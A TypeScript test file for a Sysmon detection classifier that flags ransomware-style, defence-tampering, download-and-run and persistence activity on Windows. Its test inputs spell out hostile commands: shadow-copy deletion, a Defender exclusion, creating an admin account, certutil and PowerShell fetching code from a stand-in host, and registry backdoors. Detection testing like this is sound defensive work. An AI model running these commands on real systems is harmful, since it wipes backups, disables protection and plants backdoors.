import assert from 'node:assert/strict';
import { test } from 'node:test';
import { classifySysmon } from './sysmon-rules.js';

const p1 = (Image: string, CommandLine: string, ParentImage = 'C:\\Windows\\explorer.exe') => classifySysmon(1, { Image, CommandLine, ParentImage });

test('ransomware-style and defence-tampering commands are critical', () => {
  assert.equal(p1('C:\\Windows\\System32\\vssadmin.exe', 'vssadmin.exe delete shadows /all /quiet')?.severity, 'critical');
  assert.equal(p1('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell -c Add-MpPreference -ExclusionPath C:\\')?.rule, 'sysmon_tamper_cmd');
  assert.equal(p1('C:\\Windows\\System32\\net.exe', 'net localgroup administrators evil /add')?.severity, 'critical');
  assert.equal(p1('C:\\Windows\\System32\\bcdedit.exe', 'bcdedit /set {default} recoveryenabled No')?.severity, 'critical');
  assert.equal(p1('C:\\Windows\\System32\\certutil.exe', 'certutil -urlcache -split -f http://x/a.exe a.exe')?.rule, 'sysmon_tamper_cmd');
});

test('a document starting a shell is high; Explorer starting one is not', () => {
  assert.equal(p1('C:\\Windows\\System32\\cmd.exe', 'cmd /c whoami', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE')?.rule, 'sysmon_doc_spawn');
  assert.equal(p1('C:\\Windows\\System32\\cmd.exe', 'cmd /c dir'), null);
});

test('encoded / download-and-run PowerShell is caught, ordinary scripts are not', () => {
  assert.equal(p1('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA')?.rule, 'sysmon_powershell');
  assert.equal(p1('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')")?.rule, 'sysmon_powershell');
  assert.equal(p1('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File D:\\Project_001\\SENTINEL\\scripts\\device-health.ps1'), null, "SENTINEL's own checks");
  assert.equal(p1('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'powershell -c Invoke-WebRequest https://example.com'), null, 'a plain download is not enough');
});

test('programs from temp folders need a signature check; Public is high', () => {
  const t = p1('C:\\Users\\me\\AppData\\Local\\Temp\\x\\setup.exe', 'setup.exe')!;
  assert.equal(t.rule, 'sysmon_temp_program');
  assert.equal(t.severity, 'medium');
  assert.deepEqual(t.sig, { path: 'C:\\Users\\me\\AppData\\Local\\Temp\\x\\setup.exe', signed: null }, 'signed installers are ignored');
  assert.equal(p1('C:\\Users\\Public\\a.exe', 'a.exe')!.severity, 'high');
  assert.equal(p1('C:\\Program Files\\App\\app.exe', 'app.exe'), null);
});

test('network: borrowed Windows tools going out are flagged, local and Tailscale traffic is not', () => {
  assert.equal(classifySysmon(3, { Image: 'C:\\Windows\\System32\\mshta.exe', DestinationIp: '45.1.2.3', DestinationPort: '443' })?.severity, 'high');
  assert.equal(classifySysmon(3, { Image: 'C:\\Windows\\System32\\rundll32.exe', DestinationIp: '45.1.2.3' })?.severity, 'medium');
  assert.equal(classifySysmon(3, { Image: 'C:\\Windows\\System32\\mshta.exe', DestinationIp: '100.64.0.20' }), null);
  assert.equal(classifySysmon(3, { Image: 'C:\\Windows\\System32\\mshta.exe', DestinationIp: '192.168.1.5' }), null);
});

test('LSASS access and injection depend on the signature', () => {
  const l = classifySysmon(10, { SourceImage: 'C:\\Users\\me\\Downloads\\m.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1010' })!;
  assert.equal(l.severity, 'critical');
  assert.equal(l.sig?.signed, 'medium');
  assert.equal(classifySysmon(8, { SourceImage: 'C:\\Windows\\System32\\csrss.exe', TargetImage: 'C:\\Windows\\explorer.exe' }), null);
});

test('registry: UAC off and Winlogon changes are critical, turning UAC on is fine', () => {
  const reg = (TargetObject: string, Details: string) => classifySysmon(13, { Image: 'C:\\Windows\\regedit.exe', EventType: 'SetValue', TargetObject, Details });
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA', 'DWORD (0x00000000)')?.severity, 'critical');
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA', 'DWORD (0x00000001)'), null);
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell', 'explorer.exe'), null);
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell', 'explorer.exe, C:\\Users\\Public\\x.exe')?.severity, 'critical');
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit', 'C:\\Windows\\system32\\userinit.exe,'), null);
  assert.equal(reg('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger', 'cmd.exe')?.severity, 'high');
});

test('startup folder: programs and scripts high, shortcuts low', () => {
  const f = (TargetFilename: string) => classifySysmon(11, { Image: 'C:\\x\\y.exe', TargetFilename });
  assert.equal(f('C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs')?.severity, 'high');
  assert.equal(f('C:\\Users\\me\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Discord.lnk')?.severity, 'low');
  assert.equal(f('C:\\Users\\me\\Documents\\a.txt'), null);
});
